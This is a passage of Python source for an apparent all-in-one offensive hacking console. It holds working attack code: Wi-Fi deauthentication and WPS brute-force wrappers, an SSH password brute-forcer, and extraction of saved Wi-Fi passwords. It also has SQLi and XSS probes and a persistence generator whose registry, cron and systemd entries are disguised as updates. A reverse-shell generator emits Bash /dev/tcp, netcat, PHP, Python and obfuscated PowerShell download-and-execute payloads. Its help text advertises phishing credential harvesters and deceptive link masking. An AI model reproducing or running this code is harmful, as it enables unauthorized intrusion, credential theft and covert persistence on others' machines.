    ag_path = shutil.which("airgeddon")
    if not ag_path: 
        # Check local if script exists
        if os.path.exists("./airgeddon.sh"): ag_path = "./airgeddon.sh"
        else: print(f"{Colors.RED}[!] Airgeddon not found.{Colors.RESET}"); return
    print(f"{Colors.TEXT}Launching Airgeddon...{Colors.RESET}")
    try: subprocess.run(['sudo', ag_path] if os.name != 'nt' else ['bash', ag_path], shell=True if os.name != 'nt' else False)
    except KeyboardInterrupt: print(f"\n{Colors.WARNING}[!] Airgeddon closed.{Colors.RESET}")

def kismet_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}KISMET WIRELESS SNIFFER {Colors.BORDER}]══╗{Colors.RESET}\n")
    import shutil
    kismet_path = shutil.which("kismet")
    if not kismet_path: print(f"{Colors.RED}[!] Kismet not found.{Colors.RESET}"); return
    print(f"{Colors.TEXT}Starting Kismet server/UI...{Colors.RESET}")
    try: subprocess.run([kismet_path])
    except KeyboardInterrupt: print(f"\n{Colors.WARNING}[!] Kismet stopped.{Colors.RESET}")

def aircrack_suite_menu():
    menu_map = {
        '1': ("Capture Handshake (Airodump-ng)", lambda: subprocess.run([get_aircrack_path("airodump-ng"), get_validated_input("Interface")])),
        '2': ("Deauth Attack (Aireplay-ng)", lambda: subprocess.run([get_aircrack_path("aireplay-ng"), "--deauth", "0", "-a", get_validated_input("BSSID"), get_validated_input("Interface")])),
        '3': ("Handshake Crack (Aircrack-ng)", lambda: subprocess.run([get_aircrack_path("aircrack-ng"), "-w", get_validated_input("Wordlist"), get_validated_input("Cap File")])),
        '4': ("Interface Management (Airmon-ng)", lambda: subprocess.run([get_aircrack_path("airmon-ng")]))
    }
    while True:
        display_banner()
        print(f"{Colors.BORDER}╔════[ {Colors.HEADER}AIRCRACK-NG COMPLETE SUITE {Colors.BORDER}]════╗{Colors.RESET}\n")
        for k, (n, _) in menu_map.items(): print(f" {Colors.ACCENT}[{k}]{Colors.TEXT} {n}{Colors.RESET}")
        print(f" {Colors.ACCENT}[9]{Colors.TEXT} Exit Suite{Colors.RESET}\n")
        choice = input(get_prompt())
        if choice in menu_map: 
            try: menu_map[choice][1]()
            except Exception as e: print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
            pause()
        elif choice == '9': return

def reaver_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}REAVER WPS BRUTE-FORCER {Colors.BORDER}]══╗{Colors.RESET}\n")
    import shutil
    reaver_path = shutil.which("reaver")
    if not reaver_path: print(f"{Colors.RED}[!] Reaver not found in system PATH.{Colors.RESET}"); return
    iface = get_validated_input("Monitor Mode Interface (e.g., wlan0mon)")
    bssid = get_validated_input("Target BSSID")
    print(f" {Colors.PURPLE}[1]{Colors.WHITE} Basic Attack (-vv)\n {Colors.PURPLE}[2]{Colors.WHITE} Pixie Dust Attack (-K 1)\n {Colors.PURPLE}[3]{Colors.WHITE} Custom Args")
    choice = get_validated_input("Select Mode", valid_range=["1", "2", "3"])
    cmd = [reaver_path, '-i', iface, '-b', bssid, '-vv']
    if choice == '2': cmd.append('-K 1')
    elif choice == '3': cmd.extend(get_validated_input("Enter arguments").split())
    print(f"\n{Colors.ACCENT}[*] Launching Reaver... (Ctrl+C to stop){Colors.RESET}")
    try: subprocess.run(cmd)
    except KeyboardInterrupt: print(f"\n{Colors.WARNING}[!] Reaver stopped.{Colors.RESET}")

def wifi_auditor_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}WIRELESS SECURITY AUDITOR {Colors.BORDER}]══╗{Colors.RESET}\n")
    print(f" {Colors.PURPLE}[1]{Colors.WHITE} Local Host (Extract Saved Passwords){Colors.RESET}")
    print(f" {Colors.PURPLE}[2]{Colors.WHITE} Native Brute-Force (Python Script){Colors.RESET}")
    print(f" {Colors.PURPLE}[3]{Colors.WHITE} Aircrack-ng Suite (Airodump/Aireplay/Cracker){Colors.RESET}")
    print(f" {Colors.PURPLE}[4]{Colors.WHITE} WPA/WPA2 Handshake (John the Ripper){Colors.RESET}")
    print(f" {Colors.PURPLE}[5]{Colors.WHITE} Wifite2 (Automated Framework){Colors.RESET}")
    print(f" {Colors.PURPLE}[6]{Colors.WHITE} Airgeddon (Advanced Suite){Colors.RESET}")
    print(f" {Colors.PURPLE}[7]{Colors.WHITE} Kismet (Sniffer & Discovery){Colors.RESET}")
    print(f" {Colors.PURPLE}[8]{Colors.WHITE} Reaver WPS Brute-Forcer{Colors.RESET}")
    print(f" {Colors.PURPLE}[9]{Colors.WHITE} Bluetooth / BLE Discovery{Colors.RESET}")
    print(f" {Colors.PURPLE}[10]{Colors.WHITE} Deauthentication Attack (Classic Aireplay){Colors.RESET}")
    print(f" {Colors.PURPLE}[99]{Colors.WHITE} Return to Network Menu{Colors.RESET}\n")
    
    choice = input(get_prompt())
    
    if choice == '1':
        print(f"\n{Colors.ACCENT}[*] Extracting saved Wi-Fi profiles...{Colors.RESET}\n")
        if os.name == 'nt': # Windows
            try:
                # Get profiles
                profiles_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], encoding='utf-8', errors="ignore")
                # Regex to handle locale variations (e.g., "All User Profile" or localised equivalent)
                # It looks for lines with : and takes the second part
                profiles = re.findall(r':\s(.*)', profiles_data)
                
                # Filter out obvious headers (usually first few lines don't have SSID)
                # A heuristic: typically user profiles don't contain "Group Policy" etc.
                valid_profiles = [p.strip() for p in profiles if p.strip()] 

                for ssid in valid_profiles:
                    try:
                        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', ssid, 'key=clear'], encoding='utf-8', errors="ignore")
                        # Regex for Key Content
                        key_match = re.search(r'Key Content\s*:\s(.*)', results)
                        password = key_match.group(1).strip() if key_match else "[OPEN]"
                        
                        print(f" {Colors.GREEN}[+] SSID: {Colors.TEXT}{ssid:<20} {Colors.GREEN}Password: {Colors.TEXT}{password}{Colors.RESET}")
                    except subprocess.CalledProcessError:
                        # Likely a profile that can't be read or doesn't exist anymore
                        continue
            except Exception as e:
                print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
        else: # Linux
            path = "/etc/NetworkManager/system-connections/"
            if os.path.exists(path):
                try:
                    for filename in os.listdir(path):
                        full_path = os.path.join(path, filename)
                        if os.path.isfile(full_path):
                            with open(full_path, 'r') as f:
                                content = f.read()
                                ssid = re.findall(r'id=(.*)', content)
                                psk = re.findall(r'psk=(.*)', content)
                                if ssid:
                                    print(f" {Colors.GREEN}[+] SSID: {Colors.TEXT}{ssid[0]:<20} {Colors.GREEN}Password: {Colors.TEXT}{psk[0] if psk else '[OPEN]'}{Colors.RESET}")
                except PermissionError: print(f"{Colors.RED}[!] Root privileges required.{Colors.RESET}")
            else: print(f"{Colors.RED}[!] NetworkManager path not found.{Colors.RESET}")

    elif choice == '2':
        live_wifi_brute_force_ui()

    elif choice == '3':
        aircrack_suite_menu()

    elif choice == '4':
        wifi_handshake_cracker_john_ui()

    elif choice == '5':
        wifite_ui()

    elif choice == '6':
        airgeddon_ui()

    elif choice == '7':
        kismet_ui()

    elif choice == '8':
        reaver_ui()

    elif choice == '9':
        bt_discovery_ui()

    elif choice == '10':
        print(f"\n{Colors.ACCENT}[*] Preparing Deauthentication Attack...{Colors.RESET}")
        aireplay_path = get_aircrack_path("aireplay-ng")
        if not aireplay_path:
            print(f"{Colors.RED}[!] Aireplay-ng not found.{Colors.RESET}"); return
        
        print(f"{Colors.TEXT}This requires a network adapter in MONITOR mode.{Colors.RESET}")
        bssid = get_validated_input("Target BSSID (Access Point MAC)")
        station = get_validated_input("Target Station MAC (Leave blank for broadcast)", required=False)
        interface = get_validated_input("Interface Name (e.g., wlan0mon)")
        count = get_validated_input("Number of packets", int, default=0)
        
        cmd = [aireplay_path, '--deauth', str(count), '-a', bssid]
        if station: cmd.extend(['-c', station])
        cmd.append(interface)
        
        print(f"\n{Colors.GREEN}[*] Launching Deauth Attack (Ctrl+C to stop)...{Colors.RESET}")
        try: subprocess.run(cmd)
        except KeyboardInterrupt: print(f"\n{Colors.YELLOW}[*] Stopped.{Colors.RESET}")
        except Exception as e: print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")

    elif choice == '99': return

def ssh_brute_force_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}SSH BRUTE-FORCE {Colors.BORDER}]══╗{Colors.RESET}\n")
    if not PARAMIKO_INSTALLED:
        print(f"{Colors.RED}[!] Paramiko not installed. Run 'pip install paramiko'.{Colors.RESET}"); return
    
    target = get_validated_input("Target IP/Host")
    username = get_validated_input("Username")
    wordlist = get_validated_input("Path to Wordlist")
    port = get_validated_input("Port", int, required=False, default=22)

    if not os.path.exists(wordlist):
        print(f"{Colors.ERROR}[!] Wordlist not found.{Colors.RESET}"); return

    print(f"\n{Colors.CYAN}[*] Starting SSH Brute-Force on {target}:{port}...{Colors.RESET}")
    try:
        with open(wordlist, 'r', errors='ignore') as f:
            for password in f:
                password = password.strip()
                sys.stdout.write(f"\r{Colors.WHITE}[*] Testing: {password:<20}{Colors.RESET}")
                sys.stdout.flush()
                
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    client.connect(target, port=int(port), username=username, password=password, timeout=3)
                    print(f"\n{Colors.GREEN}{Colors.BOLD}[SUCCESS] Password Found: {password}{Colors.RESET}")
                    client.close(); return
                except paramiko.AuthenticationException:
                    pass
                except Exception as e:
                    print(f"\n{Colors.RED}[!] Error: {e}{Colors.RESET}"); client.close(); return
                finally:
                    client.close()
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] SSH brute-force cancelled.{Colors.RESET}")
    print(f"\n{Colors.RED}[!] Attack finished. No password found.{Colors.RESET}")

def vuln_scanner_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}VULNERABILITY SCANNER {Colors.BORDER}]══╗{Colors.RESET}\n")
    if not REQUESTS_INSTALLED:
        print(f"{Colors.RED}[!] Requests not installed.{Colors.RESET}"); return
    
    url = get_validated_input("Target URL (e.g., http://example.com/page.php?id=1)")
    if "=" not in url:
        print(f"{Colors.RED}[!] URL must have parameters (e.g., ?id=1).{Colors.RESET}"); return

    print(f"\n{Colors.ACCENT}[*] Testing for common vulnerabilities...{Colors.RESET}")
    sqli_payloads = ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1"]
    xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>"]
    base_url = url.split('=')[0] + "="
    
    try:
        for p in sqli_payloads:
            test_url = base_url + p
            try:
                res = requests.get(test_url, timeout=5)
                if any(err in res.text.lower() for err in ["sql syntax", "mysql_fetch", "sqlite3.error", "postgresql error"]):
                    print(f"{Colors.RED}{Colors.BOLD}[!] Potential SQLi Found with payload: {p}{Colors.RESET}")
            except: pass

        for p in xss_payloads:
            test_url = base_url + p
            try:
                res = requests.get(test_url, timeout=5)
                if p in res.text:
                    print(f"{Colors.RED}{Colors.BOLD}[!] Potential XSS Found with payload: {p}{Colors.RESET}")
            except: pass
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Scanner interrupted by operator.{Colors.RESET}")
    print(f"\n{Colors.ACCENT}[*] Scan complete.{Colors.RESET}")

def lsb_stego_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}LSB STEGANOGRAPHY TOOL {Colors.BORDER}]══╗{Colors.RESET}\n")
    if not PILLOW_INSTALLED: print(f"{Colors.RED}[!] Pillow library not found. Run 'pip install Pillow'.{Colors.RESET}"); return
    print(f" {Colors.ACCENT}[1]{Colors.TEXT} Encode Message into Image\n {Colors.ACCENT}[2]{Colors.TEXT} Decode Message from Image")
    choice = get_validated_input("Select Option", valid_range=["1", "2"])
    if choice == '1':
        img_path = get_validated_input("Input Image Path (PNG recommended)")
        if not os.path.exists(img_path): print(f"{Colors.RED}[!] Image not found.{Colors.RESET}"); return
        msg, out_path = get_validated_input("Secret Message"), get_validated_input("Output Image Path", default="encoded_image.png")
        try:
            from PIL import Image
            img = Image.open(img_path).convert('RGB'); pixels = img.load()
            binary_msg = ''.join(format(ord(i), '08b') for i in msg) + '00000000'
            if len(binary_msg) > img.width * img.height * 3: print(f"{Colors.RED}[!] Message too long.{Colors.RESET}"); return
            idx = 0
            for y in range(img.height):
                for x in range(img.width):
                    r, g, b = pixels[x, y]
                    if idx < len(binary_msg): r = (r & ~1) | int(binary_msg[idx]); idx += 1
                    if idx < len(binary_msg): g = (g & ~1) | int(binary_msg[idx]); idx += 1
                    if idx < len(binary_msg): b = (b & ~1) | int(binary_msg[idx]); idx += 1
                    pixels[x, y] = (r, g, b)
                    if idx >= len(binary_msg): break
                if idx >= len(binary_msg): break
            img.save(out_path); print(f"\n{Colors.GREEN}[+] Message encoded into {out_path}{Colors.RESET}")
        except Exception as e: print(f"{Colors.RED}[!] Stego Error: {e}{Colors.RESET}")
    elif choice == '2':
        img_path = get_validated_input("Image Path")
        if not os.path.exists(img_path): print(f"{Colors.RED}[!] Image not found.{Colors.RESET}"); return
        try:
            from PIL import Image
            img = Image.open(img_path).convert('RGB'); pixels = img.load(); binary_data = ""
            for y in range(img.height):
                for x in range(img.width):
                    r, g, b = pixels[x, y]; binary_data += str(r&1) + str(g&1) + str(b&1)
            decoded_msg = ""
            for i in range(0, len(binary_data), 8):
                byte = binary_data[i:i+8]
                if byte == '00000000': break
                decoded_msg += chr(int(byte, 2))
            print(f"\n{Colors.GREEN}[+] Decoded Message:{Colors.TEXT} {decoded_msg}{Colors.RESET}")
        except Exception as e: print(f"{Colors.RED}[!] Decode Error: {e}{Colors.RESET}")

def persistence_generator_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}PERSISTENCE SCRIPT GENERATOR {Colors.BORDER}]══╗{Colors.RESET}\n")
    cmd = get_validated_input("Command to Persist (e.g., shell command)")
    print(f" {Colors.ACCENT}[1]{Colors.TEXT} Windows Registry RunKey\n {Colors.ACCENT}[2]{Colors.TEXT} Linux Crontab (@reboot)\n {Colors.ACCENT}[3]{Colors.TEXT} Linux Systemd Service")
    choice = get_validated_input("Select Method", valid_range=["1", "2", "3"])
    print("\n" + f"{Colors.TEXT}" + "="*70 + f"{Colors.RESET}")
    if choice == '1': print(f"{Colors.GREEN}# Windows Registry Persistence:{Colors.RESET}\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SentinelUpdate\" /t REG_SZ /d \"{cmd}\" /f")
    elif choice == '2': print(f"{Colors.GREEN}# Linux Crontab Persistence:{Colors.RESET}\n(crontab -l ; echo \"@reboot {cmd}\") | crontab -")
    elif choice == '3':
        svc = f"[Unit]\nDescription=System Update\nAfter=network.target\n\n[Service]\nType=simple\nExecStart={cmd}\nRestart=always\n\n[Install]\nWantedBy=multi-user.target"
        print(f"{Colors.GREEN}# Linux Systemd Service:{Colors.RESET}\n{svc}")
    print(f"{Colors.TEXT}" + "="*70 + f"{Colors.RESET}")

def payload_generator_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}REVERSE SHELL GENERATOR {Colors.BORDER}]══╗{Colors.RESET}\n")
    ip = get_validated_input("LHOST (Your IP)")
    port = get_validated_input("LPORT (Your Port)", int, valid_range=range(1, 65536))
    
    payloads = {
        "Python": f"python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
        "Bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "PowerShell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$t=(New-Object -TypeName System.Text.ASCIIEncoding).GetBytes($sb+\"PS \" + (pwd).Path + \"> \");$s.Write($t,0,$t.Length);$s.Flush()}};$c.Close()",
        "PowerShell Obfuscated": f"$c = '{base64.b64encode(f'IEX (New-Object Net.WebClient).DownloadString(\"http://{ip}/s.ps1\")'.encode()).decode()}'; $d = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($c)); IEX $d",
        "PHP": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\");'",
        "Netcat": f"nc -e /bin/bash {ip} {port}",
        "C# (Memory Load)": f"// Load this via sub-module loader\nbyte[] b = new byte[] {{ ... }}; // Add shellcode here"
    }
    print(f"\n{Colors.PURPLE}Generated Payloads:{Colors.RESET}")
    for lang, pay in payloads.items():
        print(f"\n{Colors.GREEN}[{lang}]{Colors.WHITE}\n{pay}{Colors.RESET}")

def exif_extractor_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}METADATA (EXIF) EXTRACTOR {Colors.BORDER}]══╗{Colors.RESET}\n")
    if not PILLOW_INSTALLED:
        print(f"{Colors.RED}[!] Pillow not installed. Run 'pip install Pillow'.{Colors.RESET}"); return
    
    img_path = get_validated_input("Path to Image")
    if not os.path.exists(img_path):
        print(f"{Colors.RED}[!] File not found.{Colors.RESET}"); return

    try:
        image = Image.open(img_path)
        info = image._getexif()
        if info:
            print(f"\n{Colors.GREEN}[+] Metadata Found:{Colors.RESET}")
            for tag, value in info.items():
                decoded = TAGS.get(tag, tag)
                print(f" {Colors.PURPLE}{decoded}:{Colors.WHITE} {value}{Colors.RESET}")
        else:
            print(f"\n{Colors.YELLOW}[!] No EXIF metadata found in this image.{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {e}{Colors.RESET}")

def banner_grabber_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}SERVICE BANNER GRABBER {Colors.BORDER}]══╗{Colors.RESET}\n")
    target = get_validated_input("Target IP/Host")
    port = get_validated_input("Port", int, valid_range=range(1, 65536))
    print(f"\n{Colors.ACCENT}[*] Grabbing banner from {target}:{port}...{Colors.RESET}")
    try:
        s = socket.socket(); s.settimeout(5); s.connect((target, port))
        if port in [80, 8080, 443]: s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
        banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
        if banner: print(f"{Colors.GREEN}[+] Banner: {Colors.TEXT}{banner}{Colors.RESET}")
        else: print(f"{Colors.YELLOW}[!] Connected but no banner received.{Colors.RESET}")
        s.close()
    except Exception as e: print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")

def nmap_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}NMAP INTERFACE {Colors.BORDER}]══╗{Colors.RESET}\n")
    import shutil
    nmap_path = shutil.which("nmap")
    if not nmap_path: print(f"{Colors.RED}[!] Nmap not found in system PATH.{Colors.RESET}"); return
    target = get_validated_input("Target IP/Range")
    print(f" {Colors.PURPLE}[1]{Colors.WHITE} Quick Scan (-F)\n {Colors.PURPLE}[2]{Colors.WHITE} OS & Service Detection (-A)\n {Colors.PURPLE}[3]{Colors.WHITE} Vulnerability Scan (--script vuln)")
    choice = get_validated_input("Select Mode", valid_range=["1", "2", "3"])
    cmd = [nmap_path, target]
    if choice == '1': cmd.append("-F")
    elif choice == '2': cmd.append("-A")
    elif choice == '3': cmd.extend(["--script", "vuln"])
    print(f"\n{Colors.ACCENT}[*] Running Nmap... (Ctrl+C to stop){Colors.RESET}")
    try: subprocess.run(cmd)
    except KeyboardInterrupt: print(f"\n{Colors.WARNING}[!] Nmap interrupted.{Colors.RESET}")

def hydra_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}HYDRA BRUTE-FORCE ENGINE {Colors.BORDER}]══╗{Colors.RESET}\n")
    import shutil
    hydra_path = shutil.which("hydra")
    if not hydra_path: print(f"{Colors.RED}[!] Hydra not found in system PATH.{Colors.RESET}"); return
    target, service = get_validated_input("Target IP/Host"), get_validated_input("Service (e.g., ssh, ftp, rdp)")
    user = get_validated_input("Username (or path to userlist)", required=False, default="admin")
    passlist = get_validated_input("Path to Password List", default="passwords.txt")
    cmd = [hydra_path]
    if os.path.exists(user): cmd.extend(['-L', user])
    else: cmd.extend(['-l', user])
    cmd.extend(['-P', passlist, '-t', '4', f'{service}://{target}'])
    print(f"\n{Colors.ACCENT}[*] Launching Hydra... (Ctrl+C to stop){Colors.RESET}")
    try: subprocess.run(cmd)
    except KeyboardInterrupt: print(f"\n{Colors.WARNING}[!] Hydra interrupted.{Colors.RESET}")

def network_exploit_menu():
    menu_map = {
        '1': ("Network Scanner (Internal)", network_scanner_menu),
        '2': ("Nmap Advanced Scanner", nmap_ui),
        '3': ("Service Banner Grabber", banner_grabber_ui),
        '4': ("Hydra Multi-Protocol Brute", hydra_ui),
        '5': ("FTP Brute-Force (Legacy)", ftp_brute_force_ui),
        '6': ("SSH Brute-Force (Legacy)", ssh_brute_force_ui),
        '7': ("Wireless Security Auditor", wifi_auditor_ui)
    }
    while True:
        try:
            display_banner()
            print(f"{Colors.BORDER}╔════[ {Colors.HEADER}NETWORK EXPLOITATION {Colors.BORDER}]════╗{Colors.RESET}\n")
            for key, (name, _) in menu_map.items(): 
                print(f"{Colors.BORDER}║ {Colors.ACCENT}[{key}]{Colors.TEXT} {name:<41} {Colors.BORDER}║{Colors.RESET}")
            print(f"{Colors.BORDER}╠══════════════════════════════════════════════════╣{Colors.RESET}")
            print(f"{Colors.BORDER}║ {Colors.ACCENT}[9]{Colors.TEXT} Return to Mainframe                     {Colors.BORDER}║{Colors.RESET}")
            print(f"{Colors.BORDER}╚══════════════════════════════════════════════════╝{Colors.RESET}\n")
            choice = input(get_prompt())
            if choice in menu_map: menu_map[choice][1](); pause()
            elif choice == '9': return
            else: print(f"\n{Colors.RED}[!] Invalid command.{Colors.RESET}"); time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n\n{Colors.WARNING}[!] Operation Cancelled. Returning to Network Menu...{Colors.RESET}")
            time.sleep(1.5)

def forensics_menu():
    menu_map = {
        '1': ("TShark Live Packet Capture", tshark_capture_ui),
        '2': ("LSB Steganography (Hide data in PNG)", lsb_stego_ui),
        '3': ("ZIP Archive Cracker", zip_cracker_ui),
        '4': ("Metadata (EXIF) Extractor", exif_extractor_ui),
        '5': ("Spam Detector", spam_detector_ui)
    }
    while True:
        try:
            display_banner()
            print(f"{Colors.BORDER}╔════[ {Colors.HEADER}FORENSICS & ANALYSIS {Colors.BORDER}]════╗{Colors.RESET}\n")
            for key, (name, _) in menu_map.items(): 
                print(f"{Colors.BORDER}║ {Colors.ACCENT}[{key}]{Colors.TEXT} {name:<41} {Colors.BORDER}║{Colors.RESET}")
            print(f"{Colors.BORDER}╠══════════════════════════════════════════════════╣{Colors.RESET}")
            print(f"{Colors.BORDER}║ {Colors.ACCENT}[9]{Colors.TEXT} Return to Mainframe                     {Colors.BORDER}║{Colors.RESET}")
            print(f"{Colors.BORDER}╚══════════════════════════════════════════════════╝{Colors.RESET}\n")
            choice = input(get_prompt())
            if choice in menu_map: menu_map[choice][1](); pause()
            elif choice == '9': return
            else: print(f"\n{Colors.RED}[!] Invalid command.{Colors.RESET}"); time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n\n{Colors.WARNING}[!] Operation Cancelled. Returning to Forensics Menu...{Colors.RESET}")
            time.sleep(1.5)

def wordlist_generator_ui():
    display_banner()
    print(f"{Colors.BORDER}╔══[ {Colors.HEADER}QUICK WORDLIST GENERATOR {Colors.BORDER}]══╗{Colors.RESET}\n")
    filename = get_validated_input("Output filename (e.g., custom.txt)")
    print(f"{Colors.TEXT}Enter keywords related to the target (name, birthday, pet, etc.), separated by commas:{Colors.RESET}")
    keywords = get_validated_input("Keywords").split(',')
    
    passwords = []
    for k in keywords:
        k = k.strip()
        if k:
            passwords.extend([k, k+"123", k+"2024", k+"2025", k+"!", k.capitalize(), k.upper()])
    
    with open(filename, 'w') as f:
        f.write('\n'.join(set(passwords)))
    
    print(f"\n{Colors.GREEN}[SUCCESS] Created {filename} with {len(set(passwords))} potential passwords.{Colors.RESET}")

def misc_menu():
    menu_map = {
        '1': ("Financial Analysis Simulator", financial_analysis_menu),
        '2': ("Persistence Script Generator", persistence_generator_ui),
        '3': ("Reverse Shell Generator", payload_generator_ui),
        '4': ("Quick Wordlist Generator", wordlist_generator_ui)
    }
    while True:
        try:
            display_banner()
            print(f"{Colors.BORDER}╔════[ {Colors.HEADER}MISCELLANEOUS MODULES {Colors.BORDER}]════╗{Colors.RESET}\n")
            for key, (name, _) in menu_map.items(): 
                print(f"{Colors.BORDER}║ {Colors.ACCENT}[{key}]{Colors.TEXT} {name:<41} {Colors.BORDER}║{Colors.RESET}")
            print(f"{Colors.BORDER}╠══════════════════════════════════════════════════╣{Colors.RESET}")
            print(f"{Colors.BORDER}║ {Colors.ACCENT}[9]{Colors.TEXT} Return to Mainframe                     {Colors.BORDER}║{Colors.RESET}")
            print(f"{Colors.BORDER}╚══════════════════════════════════════════════════╝{Colors.RESET}\n")
            choice = input(get_prompt())
            if choice in menu_map: menu_map[choice][1](); pause()
            elif choice == '9': return
            else: print(f"\n{Colors.RED}[!] Invalid command.{Colors.RESET}"); time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n\n{Colors.WARNING}[!] Operation Cancelled. Returning to Miscellaneous Menu...{Colors.RESET}")
            time.sleep(1.5)

def display_help():
    display_banner()
    print(f"{Colors.BORDER}╔══════════════════════════════════════════════════════════════════╗{Colors.RESET}")
    print(f"{Colors.BORDER}║ {Colors.HEADER}                    SYSTEM DOCUMENTATION                          {Colors.BORDER}║{Colors.RESET}")
    print(f"{Colors.BORDER}╚══════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
    
    def print_section(title, items):
        print(f"{Colors.ACCENT}┌──[ {Colors.HEADER}{title} {Colors.ACCENT}] {Colors.BORDER}" + "─" * (55 - len(title)) + f"{Colors.RESET}")
        for key, desc in items:
            print(f"{Colors.ACCENT}│ {Colors.BORDER}»{Colors.RESET} {Colors.HEADER}{key}:{Colors.RESET} {Colors.TEXT}{desc}{Colors.RESET}")
        print(f"{Colors.ACCENT}└" + "─" * 65 + f"{Colors.RESET}\n")

    print_section("SYSTEM CONTROLS", [
        ("Ctrl+C", "Gracefully cancel any active scan or return to previous menu."),
        ("Navigation", "Use numeric indices [1-9] to navigate the mainframe."),
        ("Terminator", "Use [0] in the Mainframe to safely close all connections."),
        ("Validation", "Input fields now enforce data types and existence checks.")
    ])

    print_section("CRYPTOGRAPHY", [
        ("Hash Cracker", "Parallelized mask attacks (?l, ?u, ?d, ?s) on MD5/SHA1/SHA256."),
        ("John the Ripper", "CPU hybrid cracker with advanced wordlist rules."),
        ("Hashcat", "GPU-accelerated cracking for WPA2, MD5, and SHA families."),
        ("Hash Generator", "Instant generation of MD5, SHA1, SHA256, and SHA512."),
        ("Base64 Util", "Sleek utility for encoding and decoding data packets.")
    ])

    print_section("OSINT & RECONNAISSANCE", [
        ("Sherlock Lite", "Fast username enumeration across multiple platforms."),
        ("Google Dorks", "Automated search queries for finding sensitive exposure."),
        ("Whois Lookup", "Domain registration and ownership intelligence.")
    ])

    print_section("WEB VULNERABILITY SCANNERS", [
        ("Subdomain Scanner", "Threaded enumeration of infrastructure subdomains."),
        ("Directory Buster", "Forceful discovery of hidden directories and assets."),
        ("CMS Fingerprint", "Detection of WordPress, Joomla, Drupal, and more."),
        ("SQLmap Automator", "Automated SQL injection testing via SQLmap integration."),
        ("API Fuzzer", "Fast endpoint discovery for RESTful architectures."),
        ("Vuln Scanner", "Heuristic testing for reflected XSS and SQLi.")
    ])

    print_section("NETWORK EXPLOITATION", [
        ("Network Scanner", "High-speed multi-threaded port discovery."),
        ("Nmap Advanced", "OS fingerprinting and service auditing via Nmap."),
        ("Banner Grabber", "Raw socket service identification."),
        ("Hydra Engine", "Lightning-fast multi-protocol login cracking."),
        ("Wireless Auditor", "Wi-Fi cracking, WPS attacks, and automated frameworks.")
    ])

    print_section("WIRELESS AUDITOR FRAMEWORKS", [
        ("Aircrack-ng Suite", "Consolidated interface for airodump, aireplay, and mon-ng."),
        ("Wifite2", "Automated wireless auditing for WPA/WPS/WEP."),
        ("Airgeddon", "Complete wireless suite with evil twin and deauth features."),
        ("Kismet", "Industrial sniffer, wardriving, and discovery tool."),
        ("Reaver", "WPS PIN brute-forcing and Pixie Dust payloads.")
    ])

    print_section("CYBER FORENSICS", [
        ("Packet Capture", "Real-time traffic analysis using TShark / Airodump."),
        ("LSB Stego", "Hiding and extracting messages within image pixels."),
        ("Archive Discovery", "High-speed decryption of protected ZIP archives."),
        ("Metadata Analysis", "Deep dive EXIF data extraction from image files.")
    ])

    print_section("SOCIAL ENGINEERING", [
        ("Credential Harvester", "Advanced phishing templates with tunnel-bypass headers."),
        ("Link Masker", "Generating deceptive URLs for target engagement.")
    ])

    print_section("MISCELLANEOUS", [
        ("Persistence Gen", "Creation of registry and systemd persistence scripts."),
        ("Payload Engine", "Reverse shell generation with obfuscation options."),
        ("Financial Sim", "Stock market pattern analysis and trading simulation."),
        ("Wordlist Gen", "Custom dictionary creation based on target keywords.")
    ])

def main_menu():
    menu_map = {
        '1': ("Cryptography", crypto_menu),
        '2': ("OSINT & Reconnaissance", osint_menu),
        '3': ("Web Vulnerability Scanners", web_recon_menu),
        '4': ("Network Exploitation", network_exploit_menu),
        '5': ("Forensics & Analysis", forensics_menu),
        '6': ("Phishing", phishing_menu),
